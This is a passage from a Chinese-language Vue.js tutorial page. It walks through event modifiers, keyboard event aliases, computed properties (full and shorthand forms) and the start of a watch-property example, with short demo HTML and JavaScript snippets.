--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 事件只触发一次（常用） --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 使用事件的捕获模式 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span> @<span class="attr">click.capture</span>=<span class="string">&quot;showMsg(1)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">div1</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showMsg(2)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">div2</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 只有event.target是当前操作的元素时才触发事件； --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo1&quot;</span> @<span class="attr">click.self</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span> @<span class="attr">wheel.passive</span>=<span class="string">&quot;demo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">showInfo</span>(<span class="params">e</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">alert(<span class="string">&#x27;同学你好！&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(e.target)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">showMsg</span>(<span class="params">msg</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(msg)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">&#x27;#&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">&#x27;累坏了&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h3><p>在一些搜索框中，我们往往需要监听键盘的按下(onkeydown)或抬起(onkeyup)事件以进行一些操作。在原生js或者jQuery中，我们需要判断e.keyCode的值来获取用户所按的键。这样就存在一个问题：我们必须知道某个按键的keyCode值才能完成匹配，使用起来十分不便。</p><ul><li>keyCode    实际键值</li><li>48到57    0到9</li><li>65到90    a到z（A到Z）</li><li>112到135    F1到F24</li><li>8    BackSpace（退格）</li><li>9    Tab</li><li>13    Enter（回车）</li><li>20    Caps_Lock（大写锁定）</li><li>32    Space（空格键）</li><li>37    Left（左箭头）</li><li>38    Up（上箭头）</li><li>39    Right（右箭头）</li><li>40    Down（下箭头）</li></ul><p>keyCode    实际键值<br>48到57    0到9<br>65到90    a到z（A到Z）<br>112到135    F1到F24<br>8    BackSpace（退格）<br>9    Tab<br>13    Enter（回车）<br>20    Caps_Lock（大写锁定）<br>32    Space（空格键）<br>37    Left（左箭头）<br>38    Up（上箭头）<br>39    Right（右箭头）<br>40    Down（下箭头）<br>在Vue中，已经为常用的按键设置了别名，这样我们就无需再去匹配<code>keyCode</code>，直接使用别名就能监听按键的事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input @keyup.enter=<span class="string">&quot;function&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>在Vue中，已经为常用的按键设置了别名，这样我们就无需再去匹配keyCode，直接使用别名就能监听按键的事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input @keyup.enter=<span class="string">&quot;function&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>别名    实际键值<br>.delete    delete（删除）/BackSpace（退格）<br>.tab    Tab<br>.enter    Enter（回车）<br>.esc    Esc（退出）<br>.space    Space（空格键）<br>.left    Left（左箭头）<br>.up    Up（上箭头）<br>.right    Right（右箭头）<br>.down    Down（下箭头）<br>.ctrl    Ctrl<br>.alt    Alt<br>.shift    Shift<br>.meta    (window系统下是window键，mac下是command键)</p><p>另外，Vue中还支持组合写法：</p><table><thead><tr><th>组合写法</th><th>按键组合</th></tr></thead><tbody><tr><td>@keyup.alt.67=”function”</td><td>Alt + C</td></tr><tr><td>@click.ctrl=”function”</td><td>Ctrl + Click</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>键盘事件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">1.Vue中常用的按键别名：</span></span></span><br><span class="line"><span class="comment"><span class="xml">回车 =&gt; enter</span></span></span><br><span class="line"><span class="comment"><span class="xml">删除 =&gt; delete (捕获“删除”和“退格”键)</span></span></span><br><span class="line"><span class="comment"><span class="xml">退出 =&gt; esc</span></span></span><br><span class="line"><span class="comment"><span class="xml">空格 =&gt; space</span></span></span><br><span class="line"><span class="comment"><span class="xml">换行 =&gt; tab (特殊，必须配合keydown去使用)</span></span></span><br><span class="line"><span class="comment"><span class="xml">上 =&gt; up</span></span></span><br><span class="line"><span class="comment"><span class="xml">下 =&gt; down</span></span></span><br><span class="line"><span class="comment"><span class="xml">左 =&gt; left</span></span></span><br><span class="line"><span class="comment"><span class="xml">右 =&gt; right</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">3.系统修饰键（用法特殊）：ctrl、alt、shift、meta</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).配合keydown使用：正常触发事件。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">4.也可以使用keyCode去指定具体的按键（不推荐）</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;按下回车提示输入&quot;</span> @<span class="attr">keydown.huiche</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.keyCodes.huiche = <span class="number">13</span> <span class="comment">//定义了一个别名按键</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">showInfo</span>(<span class="params">e</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// console.log(e.key,e.keyCode)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(e.target.value)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h2><h3 id="计算属性全写"><a href="#计算属性全写" class="headerlink" title="计算属性全写"></a>计算属性全写</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;姓名案例_计算属性实现&lt;/title&gt;</span><br><span class="line">&lt;!-- 引入Vue --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">计算属性：</span><br><span class="line">1.定义：要用的属性不存在，要通过已有属性计算得来。</span><br><span class="line">2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。</span><br><span class="line">3.get函数什么时候执行？</span><br><span class="line">(1).初次读取时会执行一次。</span><br><span class="line">(2).当依赖的数据发生改变时会被再次调用。</span><br><span class="line">4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。</span><br><span class="line">5.备注：</span><br><span class="line">1.计算属性最终会出现在vm上，直接读取使用即可。</span><br><span class="line">2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。</span><br><span class="line"> --&gt;</span><br><span class="line">&lt;!-- 准备好一个容器--&gt;</span><br><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">测试：&lt;input type=&quot;text&quot; v-model=&quot;x&quot;&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">&lt;!-- 全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; --&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。</span><br><span class="line"></span><br><span class="line">const vm = new Vue(&#123;</span><br><span class="line">el:&#x27;#root&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">firstName:&#x27;张&#x27;,</span><br><span class="line">lastName:&#x27;三&#x27;,</span><br><span class="line">x:&#x27;你好&#x27;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">demo()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line">fullName:&#123;</span><br><span class="line">//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值</span><br><span class="line">//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。</span><br><span class="line">get()&#123;</span><br><span class="line">console.log(&#x27;get被调用了&#x27;)</span><br><span class="line">// console.log(this) //此处的this是vm</span><br><span class="line">return this.firstName + &#x27;-&#x27; + this.lastName</span><br><span class="line">&#125;,</span><br><span class="line">//set什么时候调用? 当fullName被修改时。</span><br><span class="line">set(value)&#123;</span><br><span class="line">console.log(&#x27;set&#x27;,value)</span><br><span class="line">const arr = value.split(&#x27;-&#x27;)</span><br><span class="line">this.firstName = arr[0]</span><br><span class="line">this.lastName = arr[1]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="计算属性简写"><a href="#计算属性简写" class="headerlink" title="计算属性简写"></a>计算属性简写</h3><p><strong>只有当只有get方法时,不使用set方法即,计算属性只用来读取,不需要对其进行修改时,可以使用计算属性的简写形式</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;姓名案例_计算属性实现&lt;/title&gt;</span><br><span class="line">&lt;!-- 引入Vue --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- 准备好一个容器--&gt;</span><br><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。</span><br><span class="line"></span><br><span class="line">const vm = new Vue(&#123;</span><br><span class="line">el:&#x27;#root&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">firstName:&#x27;张&#x27;,</span><br><span class="line">lastName:&#x27;三&#x27;,</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line">//完整写法</span><br><span class="line">/* fullName:&#123;</span><br><span class="line">get()&#123;</span><br><span class="line">console.log(&#x27;get被调用了&#x27;)</span><br><span class="line">return this.firstName + &#x27;-&#x27; + this.lastName</span><br><span class="line">&#125;,</span><br><span class="line">set(value)&#123;</span><br><span class="line">console.log(&#x27;set&#x27;,value)</span><br><span class="line">const arr = value.split(&#x27;-&#x27;)</span><br><span class="line">this.firstName = arr[0]</span><br><span class="line">this.lastName = arr[1]</span><br><span class="line">&#125;</span><br><span class="line">&#125; */</span><br><span class="line">//简写</span><br><span class="line">fullName()&#123;</span><br><span class="line">console.log(&#x27;get被调用了&#x27;)</span><br><span class="line">return this.firstName + &#x27;-&#x27; + this.lastName</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="监视属性"><a href="#监视属性" class="headerlink" title="监视属性"></a>监视属性</h2><h3 id="监视属性天气变化"><a href="#监视属性天气变化" class="headerlink" title="监视属性天气变化"></a>监视属性天气变化</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>天气案例_监视属性<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">监视属性watch：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.监视的属性必须存在，才能进行监视！！</span></span></span><br><span class="line"><span class="comment"><span class="xml">3.监视的两种写法：</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).new Vue时传入watch配置</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).通过vm.$watch监视</span></span></span><br><span class="line"><span class="comment"><span class="xml"> --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeWeather&quot;</span>&gt;</span>切换天气<span 